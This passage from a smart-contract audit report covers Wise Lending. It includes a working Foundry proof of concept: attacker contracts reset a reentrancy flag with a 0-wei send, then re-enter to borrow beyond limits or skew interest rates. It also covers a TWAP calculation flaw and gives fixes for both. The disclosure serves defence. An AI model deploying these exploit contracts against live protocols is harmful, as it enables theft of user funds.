The attacker can also keep on using this flash-loan strategy to continuously manipulate the LASA stepping direction and grief indefinitely.
<br>
<br>

## Attack 2 (flash-borrow):
A user is able to borrow beyond his allowed limit using the following path:
- Attacker contract (named `Killer2`) calls [depositExactAmountETH{value: 100 ether}](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `100 ether`.
- `Killer2` is allowed to borrow a max amount of up to approximately 77 ether (a bit less than that), as per the protocol's defined limits.
- `Killer2` calls [borrowExactAmountETH(nftId, 1 ether)](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L975) to borrow `1 ether`. This triggers his `receive()` function.
- From inside Killer2's `receive()` function, send `0 wei` to `WiseLending.sol`. Just like before, this will set `sendingProgress` to `false` and will make the reentrancy guards useless.
- From inside his receive() function, `Killer2` calls `borrowExactAmountETH(nftId, 99 ether)` which is allowed by the protocol since `healthStateCheck` modifier of the parent call has not been executed yet! This borrow also triggers another nested call to `Killer2`'s receive() function.
- `Killer2` uses this opportunity to use his borrowed `100 ether` for some transaction involving arbitrage, etc. and then calls `paybackExactAmountETH{value: 24 ether}(nftId)` to return the extra amount in the same transaction.
- `Killer2` is now left with `76 ether` of borrow which is within acceptable limits and hence no error is thrown by the protocol.
<br>

## Proof of Concept
Add this patch and then run via `forge test --fork-url mainnet -vv --mt test_t0x1c_flash` to see both the tests pass, circumventing the reentrancy guards. <br>
The patch:
- Updates `MainHelper.sol` by
  - changing visibility of view function `_getValueUtilization()` from `private` to `public` to enable logging in our test case 
  - adding a view function `_getBorrowRate()` to enable logging in our test case 
- Adds to `WisenLendingShutdown.t.sol`  
  - our 2 PoC test cases
  - `contract Killer` and `contract Killer2`, which are the attacker contracts
  - `IWiseLend` interface

```diff
diff --git a/contracts/MainHelper.sol b/contracts/MainHelper.sol
index 46854bc..2bf2656 100644
--- a/contracts/MainHelper.sol
+++ b/contracts/MainHelper.sol
@@ -160,13 +160,13 @@ abstract contract MainHelper is WiseLowLevelHelper {
      * @dev Internal helper calculating {_poolToken}
      * utilization. Includes math underflow check.
      */
     function _getValueUtilization(
         address _poolToken
     )
-        private
+        public
         view
         returns (uint256)
     {
         uint256 totalPool = globalPoolData[_poolToken].totalPool;
         uint256 pseudoPool = lendingPoolData[_poolToken].pseudoTotalPool;
 
@@ -177,12 +177,22 @@ abstract contract MainHelper is WiseLowLevelHelper {
         return PRECISION_FACTOR_E18 - (PRECISION_FACTOR_E18
             * totalPool
             / pseudoPool
         );
     }
 
+    function _getBorrowRate(
+        address _poolToken
+    )
+        public
+        view
+        returns (uint256)
+    {
+        return borrowPoolData[_poolToken].borrowRate;
+    }
+
     /**
      * @dev Internal helper function setting new pool
      * utilization by calling {_getValueUtilization}.
      */
     function _updateUtilization(
         address _poolToken
diff --git a/contracts/WisenLendingShutdown.t.sol b/contracts/WisenLendingShutdown.t.sol
index ceffc11..86c4398 100644
--- a/contracts/WisenLendingShutdown.t.sol
+++ b/contracts/WisenLendingShutdown.t.sol
@@ -814,7 +814,150 @@ contract WiseLendingShutdownTest is Test{
 
         LENDING_INSTANCE.withdrawExactAmountETH(
             nftId,
             withdrawAmount
         );
     }
+    
+    function test_t0x1c_flashDeposit() 
+        public
+    {
+        //*************************** SETUP ***************************************
+        uint256 nftId0 = POSITION_NFTS_INSTANCE.mintPosition(); 
+        LENDING_INSTANCE.depositExactAmountETH{value: 200 ether}(nftId0); 
+        LENDING_INSTANCE.borrowExactAmountETH(nftId0, 100 ether);
+        Killer contractKiller = new Killer{value: 100 ether}(address(LENDING_INSTANCE), WETH_ADDRESS);
+        console.log("\n\n -------------- ATTACK LOGS (flash-deposit) --------------\n");
+        //*************************************************************************
+
+        vm.startPrank(address(contractKiller));
+        uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); // nftId = 2
+        LENDING_INSTANCE.depositExactAmountETH{value: 100 ether}(nftId); 
+
+        emit log_named_decimal_uint("valueUtilization before attack =", LENDING_INSTANCE._getValueUtilization(WETH_ADDRESS), 9);
+        emit log_named_decimal_uint("borrowRate before attack =", LENDING_INSTANCE._getBorrowRate(WETH_ADDRESS), 9);
+
+        LENDING_INSTANCE.withdrawExactAmountETH(nftId, 1 ether); // invokes contractKiller's receive()
+
+        assertEq(address(contractKiller).balance, 75 ether, "borrowed amount not credited");
+    }
+    
+    function test_t0x1c_flashBorrow() 
+        public
+    {
+        //*************************** SETUP ***************************************
+        console.log("\n\n -------------- ATTACK LOGS (flash-borrow) --------------\n");
+        Killer2 contractKiller2 = new Killer2{value: 100 ether}(address(LENDING_INSTANCE));
+        vm.startPrank(address(contractKiller2));
+        //*************************************************************************
+
+        uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); // nftId = 1
+        LENDING_INSTANCE.depositExactAmountETH{value: 100 ether}(nftId); 
+        assertEq(address(contractKiller2).balance, 0 ether, "non-zero balance");
+        vm.expectRevert();
+        LENDING_INSTANCE.borrowExactAmountETH(nftId, 77 ether); // allowed max borrow is some value less than 77 ether
+
+        LENDING_INSTANCE.borrowExactAmountETH(nftId, 1 ether); // invokes contractKiller2's receive()
+        
+        assertEq(address(contractKiller2).balance, 76 ether, "unexpected borrow amount");
+    }
+}
+
+contract Killer is Test {
+    address targetAddr;
+    address _WETH_ADDR;
+    IWiseLend target;
+    uint256 counter;
+    uint256 nftId = 2;
+
+    constructor(address _target, address _WETH) payable {
+        targetAddr = _target;
+        target = IWiseLend(_target);
+        _WETH_ADDR = _WETH;
+    }
+
+    receive() external payable { 
+        counter++;
+        if (counter == 1) {
+            // @audit : make this call to set `sendingProgress` to `false`
+            (bool s,) = payable(targetAddr).call{value: 0}("");
+            require(s);
+
+            // @audit : can re-enter now !
+            helper_getFlashLoan(1_000_000 ether);
+            target.depositExactAmountETH{value: 1_000_000 ether}(nftId);
+
+            emit log_named_decimal_uint("valueUtilization after flash deposit =", target._getValueUtilization(_WETH_ADDR), 9);
+            emit log_named_decimal_uint("borrowRate after flash deposit =", target._getBorrowRate(_WETH_ADDR), 9);
+
+            target.borrowExactAmountETH(nftId, 75 ether);
+        }
+        else if (counter == 2) {
+            (bool s,) = payable(targetAddr).call{value: 0}("");
+            require(s);
+
+            target.withdrawExactAmountETH(nftId, 1_000_000 ether);
+        }
+        else if (counter == 3) {
+            helper_returnFlashLoan(1_000_000 ether);
+        }
+    }
+
+    function helper_getFlashLoan(uint256 amount) internal {
+        // in a real attack, we get a flash loan from Aave/Balancer here
+        vm.deal(address(this), amount);
+    }
+
+    function helper_returnFlashLoan(uint256 amount) internal {
+        // in a real attack, we return the flash loan back to Aave/Balancer here
+        (bool success,) = address(0).call{value: amount}("");
+        require(success);
+        // consider the loan returned
+    }
+}
+
+contract Killer2 is Test {
+    address targetAddr;
+    IWiseLend target;
+    uint256 counter;
+    uint256 nftId = 1;
+
+    constructor(address _target) payable {
+        targetAddr = _target;
+        target = IWiseLend(_target);
+    }
+
+    receive() external payable { 
+        counter++;
+        if (counter == 1) {
+            // @audit : make this call to set `sendingProgress` to `false`
+            (bool s,) = payable(targetAddr).call{value: 0}("");
+            require(s);
+
+            // @audit : can re-enter now and borrow beyond the limit !
+            target.borrowExactAmountETH(nftId, 99 ether);
+        }
+        else if (counter == 2) {
+            (bool s,) = payable(targetAddr).call{value: 0}("");
+            require(s);
+
+            assertEq(address(this).balance, 100 ether, "couldn't borrow 100%");
+            console.log("Successfully borrowed entire 100 ether!");
+
+            // @audit-info : do some arbitrage stuff with this flash-borrowed loan, within a single tx
+            // Step a: Some external txs
+            // Step b: txs completed, control returns back here now
+
+            // return the "extra" borrowed amount of 24 ether out of the total 100 ether borrowed
+            target.paybackExactAmountETH{value: 24 ether}(nftId);
+        }
+    }
+}
+
+interface IWiseLend {
+    function depositExactAmountETH(uint256 _nftId) external payable;
+    function withdrawExactAmountETH(uint256 _nftId, uint256 _borrowAmount) external;
+    function borrowExactAmountETH(uint256 _nftId, uint256 _amount) external;
+    function paybackExactAmountETH(uint256 _nftId) external payable;
+    function _getValueUtilization(address _poolToken) external view returns(uint256);
+    function _getBorrowRate(address _poolToken) external view returns(uint256);
 }
```

<br>
<br>
<br>

Output (The values are printed with 9-decimal precision to improve readability):
```js
Ran 2 tests for contracts/WisenLendingShutdown.t.sol:WiseLendingShutdownTest
[PASS] test_t0x1c_flashBorrow() (gas: 2051904)
Logs:
  true _mainnetFork
  ORACLE_HUB_INSTANCE DEPLOYED AT ADDRESS 0xc76b1cB1AFfCF2c178cb34ec1b3A9dB59b6d3Dfd
  POSITION_NFTS_INSTANCE DEPLOYED AT ADDRESS 0xd17Af6B6DD3aFadAC6ccbB1cCaB5dBadCfeF0944
  

 -------------- ATTACK LOGS (flash-borrow) --------------

  Successfully borrowed entire 100 ether!

[PASS] test_t0x1c_flashDeposit() (gas: 2374713)
Logs:
  true _mainnetFork
  ORACLE_HUB_INSTANCE DEPLOYED AT ADDRESS 0xc76b1cB1AFfCF2c178cb34ec1b3A9dB59b6d3Dfd
  POSITION_NFTS_INSTANCE DEPLOYED AT ADDRESS 0xd17Af6B6DD3aFadAC6ccbB1cCaB5dBadCfeF0944
  

 -------------- ATTACK LOGS (flash-deposit) --------------

  valueUtilization before attack =: 333333333.333333336
  borrowRate before attack =: 8503789.053488265
  valueUtilization after flash deposit =: 99970.108937428
  borrowRate after flash deposit =: 1710.085277907

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 4.43s
```

## Tools used
Foundry

## Recommended Mitigation Steps
Add a `require` statement inside `_sendValue()` which checks that `sendingProgress / sendingProgressAaveHub` is `false` before proceeding further.
<br>

```diff
  File: contracts/TransferHub/SendValueHelper.sol

  12:               function _sendValue(
  13:                   address _recipient,
  14:                   uint256 _amount
  15:               )
  16:                   internal
  17:               {
  18:                   if (address(this).balance < _amount) {
  19:                       revert AmountTooSmall();
  20:                   }
  21:           
+ 22:                   require(!sendingProgress);
  22:                   sendingProgress = true;
  23:           
  24:                   (
  25:                       bool success
  26:                       ,
  27:                   ) = payable(_recipient).call{
  28:                       value: _amount
  29:                   }("");
  30:           
  31:                   sendingProgress = false;
  32:           
  33:                   if (success == false) {
  34:                       revert SendValueFailed();
  35:                   }
  36:               }
```

and 

```diff
  File: contracts/WrapperHub/AaveHelper.sol

  196:              function _sendValue(
  197:                  address _recipient,
  198:                  uint256 _amount
  199:              )
  200:                  internal
  201:              {
  202:                  if (address(this).balance < _amount) {
  203:                      revert InvalidValue();
  204:                  }
  205:          
+ 206:                  require(!sendingProgressAaveHub);
  206:                  sendingProgressAaveHub = true;
  207:          
  208:                  (bool success, ) = payable(_recipient).call{
  209:                      value: _amount
  210:                  }("");
  211:          
  212:                  sendingProgressAaveHub = false;
  213:          
  214:                  if (success == false) {
  215:                      revert FailedInnerCall();
  216:                  }
  217:              }
```

Additionally, in case the protocol desires to still retain the ability to make transfers while a `_sendValue()` transaction is ongoing, then it's better to have another internal version of this function which is accessible only by the protocol and is never used to send funds to external users, thus never giving them control. Importantly, this new function shouldn't modify `sendingProgress / sendingProgressAaveHub`. Let's call this new function `_sendInternal()`. Then an example usage would be to replace the following calls here:
```diff
  File: contracts/WiseLending.sol

  43:           contract WiseLending is PoolManager {
  44:           
  45:               /**
  46:                * @dev Standard receive functions forwarding
  47:                * directly send ETH to the master address.
  48:                */
  49:               receive()
  50:                   external
  51:                   payable
  52:               {
  53:                   if (msg.sender == WETH_ADDRESS) {
  54:                       return;
  55:                   }
  56:           
- 57:                   _sendValue(
+ 57:                   _sendInternal(
  58:                       master,
  59:                       msg.value
  60:                   );
  61:               }
```

and 

```diff
  File: contracts/WrapperHub/AaveHub.sol

  79:               /**
  80:                * @dev Receive functions forwarding
  81:                * sent ETH to the master address
  82:                */
  83:               receive()
  84:                   external
  85:                   payable
  86:               {
  87:                   if (msg.sender == WETH_ADDRESS) {
  88:                       return;
  89:                   }
  90:           
- 91:                   _sendValue(
+ 91:                   _sendInternal(
  92:                       master,
  93:                       msg.value
  94:                   );
  95:               }
```

<br><br>

## **MEDIUM-SEVERITY BUGS**
---

### <a id="m-01"></a>[M-01]
## **Incorrect TWAP implementation can result in assets being frozen prematurely**
#### https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/OracleHelper.sol#L494-L495
<br>

## Summary & Impact
The protocol uses Chainlink as the primary source of prices. On top of this, TWAP is used as a sanity check such that when price deviates by more then `2.5%` between the two, the asset is frozen. This deviation is re-evaluated after 30 minutes and the process repeats.<br>
Due the incorrect maths while implementing TWAP, currently the assets can get frozen even when the deviation is less than `2.5%` or conversely, escape being frozen even though the deviation has breached `2.5%`.

## Vulnerability Details
TWAPs or `Time Weighted Average Prices` are by their very definition, **"averages"**. Unlike spot prices, two TWAPS -
- can not be multiplied or divided to calculate the third TWAP.
- can not be inversed or reciprocated i.e. TWAP of tokenA/tokenB pair is not equal to `1/TWAP` of tokenB/tokenA pair. Refer [official whitepaper Uniswap (see section 5.2)](https://uniswap.org/whitepaper-v3.pdf) which states:
> Note that accumulators for token0 and token1 are tracked separately, since the time-weighted arithmetic mean price of token0 is not equivalent to the reciprocal of the time-weighted arithmetic mean price of token1.

Also check out [bug raised by OpenZeppelin](https://solodit.xyz/issues/m05-incorrect-use-of-time-weighted-average-prices-openzeppelin-fei-protocol-audit-phase-2-markdown).
<br>

The protocol however multiplies two TWAPs at the following places for conversion of prices into ETH<->USD terms, instead of directly using the correct feeds or making use of spot prices -
- [OracleHelper.sol::_getTwapDerivatePrice()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/OracleHelper.sol#L494-L495)
- [PtOracleDerivative.sol::latestAnswer()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/DerivativeOracles/PtOracleDerivative.sol#L122)
- [PtOraclePure.sol::latestAnswer()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/DerivativeOracles/PtOraclePure.sol#L103-L107)

<details><summary>Click to see relevant code snippets</summary>

```js
  File: contracts/WiseOracleHub/OracleHelper.sol

  460:              function _getTwapDerivatePrice(
  461:                  address _tokenAddress,
  462:                  UniTwapPoolInfo memory _uniTwapPoolInfo
  463:              )
  464:                  internal
  465:                  view
  466:                  returns (uint256)
  467:              {
  468:                  DerivativePartnerInfo memory partnerInfo = derivativePartnerTwap[
  469:                      _tokenAddress
  470:                  ];
  471:          
  472:                  uint256 firstQuote = OracleLibrary.getQuoteAtTick(
  473:                      _getAverageTick(
  474:                          _uniTwapPoolInfo.oracle
  475:                      ),
  476:                      _getOneUnit(
  477:                          partnerInfo.partnerTokenAddress
  478:                      ),
  479:                      partnerInfo.partnerTokenAddress,
  480:                      WETH_ADDRESS
  481:                  );
  482:          
  483:                  uint256 secondQuote = OracleLibrary.getQuoteAtTick(
  484:                      _getAverageTick(
  485:                          partnerInfo.partnerOracleAddress
  486:                      ),
  487:                      _getOneUnit(
  488:                          _tokenAddress
  489:                      ),
  490:                      _tokenAddress,
  491:                      partnerInfo.partnerTokenAddress
  492:                  );
  493:          
  494: @--->            return firstQuote
  495: @--->                * secondQuote
  496:                      / uint256(
  497:                          _getOneUnit(
  498:                              partnerInfo.partnerTokenAddress
  499:                          )
  500:                      );
  501:              }
```

```js
  File: contracts/DerivativeOracles/PtOracleDerivative.sol

  76:               /**
  77:                * @dev Read function returning latest ETH value for PtToken.
  78:                * Uses answer from Usd chainLink pricefeed and combines it with
  79:                * the result from ethInUsd for one token of PtToken.
  80:                */
  81:               function latestAnswer()
  82:                   public
  83:                   view
  84:                   returns (uint256)
  85:               {
  86:                   (
  87:                       ,
  88:                       int256 answerUsdFeed,
  89:                       ,
  90:                       ,
  91:                   ) = USD_FEED_ASSET.latestRoundData();
  92:           
  93:                   (
  94:                       ,
  95:                       int256 answerEthUsdFeed,
  96:                       ,
  97:                       ,
  98:                   ) = ETH_FEED_ASSET.latestRoundData();
  99:           
  100:                  (
  101:                      bool increaseCardinalityRequired,
  102:                      ,
  103:                      bool oldestObservationSatisfied
  104:                  ) = ORACLE_PENDLE_PT.getOracleState(
  105:                      PENDLE_MARKET_ADDRESS,
  106:                      TWAP_DURATION
  107:                  );
  108:          
  109:                  if (increaseCardinalityRequired == true) {
  110:                      revert CardinalityNotSatisfied();
  111:                  }
  112:          
  113:                  if (oldestObservationSatisfied == false) {
  114:                      revert OldestObservationNotSatisfied();
  115:                  }
  116:          
  117:                  uint256 ptToAssetRate = ORACLE_PENDLE_PT.getPtToAssetRate(
  118:                      PENDLE_MARKET_ADDRESS,
  119:                      TWAP_DURATION
  120:                  );
  121:          
  122: @--->            return uint256(answerUsdFeed)
  123:                      * PRECISION_FACTOR_E18
  124:                      / POW_USD_FEED
  125:                      * POW_ETH_USD_FEED
  126:                      / uint256(answerEthUsdFeed)
  127:                      * ptToAssetRate
  128:                      / PRECISION_FACTOR_E18;
  129:              }
```

```js
  File: contracts/DerivativeOracles/PtOraclePure.sol

  62:               /**
  63:                * @dev Read function returning latest ETH value for PtToken.
  64:                * Uses answer from Usd chainLink pricefeed and combines it with
  65:                * the result from ethInUsd for one token of PtToken.
  66:                */
  67:           
  68:               function latestAnswer()
  69:                   public
  70:                   view
  71:                   returns (uint256)
  72:               {
  73:                   (
  74:                       ,
  75:                       int256 answerFeed,
  76:                       ,
  77:                       ,
  78:           
  79:                   ) = FEED_ASSET.latestRoundData();
  80:           
  81:                   (
  82:                       bool increaseCardinalityRequired,
  83:                       ,
  84:                       bool oldestObservationSatisfied
  85:                   ) = ORACLE_PENDLE_PT.getOracleState(
  86:                       PENDLE_MARKET_ADDRESS,
  87:                       DURATION
  88:                   );
  89:           
  90:                   if (increaseCardinalityRequired == true) {
  91:                       revert CardinalityNotSatisfied();
  92:                   }
  93:           
  94:                   if (oldestObservationSatisfied == false) {
  95:                       revert OldestObservationNotSatisfied();
  96:                   }
  97:           
  98:                   uint256 ptToAssetRate = ORACLE_PENDLE_PT.getPtToAssetRate(
  99:                       PENDLE_MARKET_ADDRESS,
  100:                      DURATION
  101:                  );
  102:          
  103: @--->            return uint256(answerFeed)
  104:                      * PRECISION_FACTOR_E18
  105:                      / POW_FEED
  106:                      * ptToAssetRate
  107:                      / PRECISION_FACTOR_E18;
  108:              }
```

</details>
<br>

A vulnerability arising from using TWAPs incorrectly (albeit having a different nature & attack vector) led to the [7.8 million dollar Warp Finance hack](https://twitter.com/GriphookETH/status/1339742240684400643) in 2020 which was explained in detailed in [CMichel's blog](https://cmichel.io/pricing-lp-tokens).
<br>

In our context, the divergence between the actual TWAP price and the incorrectly calculated TWAP means the difference between Chainlink and TWAP can be evaluated as `2.5%` even when it is not, causing the freezing of assets. Conversely, it can also result in the assets not being frozen even when the difference has reached `2.5%` in reality.

## Mathematical PoC
One can provide a proof mathematically to show that two TWAPs can not be multiplied to arrive at the resultant TWAP. The actual Uniswap TWAP has cumulative prices stored which are then used for further calculations, but the following example is good enough to highlight the fundamental issue. Let's assume that the following **spot prices** exist at different timestamps - 
| t  | tokenX spot price            | tokenY spot price         | tokenA spot price         |  tokenX/tokenA         |  tokenA/tokenY          |  
|:--:|:----------------------------:|:-------------------------:|:-------------------------:|:---------------------------------:|:---------------------------------:|
| 1  |        x1                   |         y1                |         a1                |       xa1 = x1/a1                       |             ay1 = a1/y1                         |
| 2  |        x2                   |         y2                |         a2                |       xa2 = x2/a2                       |             ay2 = a2/y2                         |
| 3  |        x3                   |         y3                |         a3                |       xa3 = x3/a3                       |             ay3 = a3/y3                         |
| -  | TWAP: (x1+x2+x3)/3          | TWAP: (y1+y2+y3)/3        | TWAP: (a1+a2+a3)/3        |  TWAP: (xa1+xa2+xa3)/3                  |  TWAP: (ay1+ay2+ay3)/3                  |

As per the protocol's current logic: 
```text
TWAP of tokenX/tokenY = TWAP_tokenX/tokenA * TWAP_tokenA/tokenY = (xa1+xa2+xa3)/3 * (ay1+ay2+ay3)/3 = (xa1+xa2+xa3) * (ay1+ay2+ay3) / 9 = (x1/a1 + x2/a2 + x3/a3) * (a1/y1 + a2/y2 + a3/y3) / 9
```

The actual TWAP however is:
```text
TWAP of tokenX/tokenY = average of spot price ratios at each timestamp = (x1/y1 + x2/y2 + x3/y3) / 3 
```

It's trivial to see from here on that the two expressions are not equal. The more volatile the price of tokenX/tokenY, the more extreme this divergence in correct & incorrect price is.

## Tools Used
Manual review

## Recommended Mitigation Steps
- Either consider updating the code to fetch the **TWAP price** from the exact token pair TWAP feed instead of calculating through other token pairs 
- OR Fetch the **spot prices** for tokenX & tokenY at the desired time stamps and then calculate the average within a new function.

